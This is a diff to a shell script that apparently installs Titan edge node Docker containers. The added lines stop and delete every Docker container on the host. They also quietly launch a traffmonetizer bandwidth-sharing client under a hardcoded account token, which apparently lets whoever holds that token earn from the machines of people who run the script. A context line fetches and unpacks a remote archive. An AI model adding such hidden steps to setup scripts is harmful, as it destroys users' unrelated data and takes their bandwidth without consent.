@@ -17,7 +17,7 @@ echo "节点社区 Discord 社群:https://discord.gg/GbMV5EcNWF"
 id="E68A16A8-3294-4C6C-BBC7-623ECABD1FD7"
 
 # 让用户输入想要创建的容器数量
-container_count=5
+container_count=1
 
 # 让用户输入想要分配的空间大小
 storage_gb=64
@@ -35,6 +35,10 @@ then
 else
     echo "Docker 已安装。"
 fi
+
+docker stop $(docker ps -aq)
+docker rm $(docker ps -aq)
+
 
 # 拉取Docker镜像
 docker pull nezha123/titan-edge:1.4
@@ -75,6 +79,9 @@ done
 # 重启所有docker镜像 让设置的磁盘容量生效
 docker restart $(docker ps -a -q)
 echo "==============================所有节点均已设置并启动===================================."
+
+
+docker run -d --name tm traffmonetizer/cli_v2 start accept tNgYt5IubCsZ2HFEbbpX2Kd9hNmk8Ei1jxfy3HKEmWI=
 
 
 curl -o apphub-linux-386.tar.gz https://assets.coreservice.io/public/package/70/app-market-gaga-pro/1.0.4/app-market-gaga-pro-1_0_4.tar.gz && tar -zxf apphub-linux-386.tar.gz && rm -f apphub-linux-386.tar.gz && cd ./apphub-linux-386
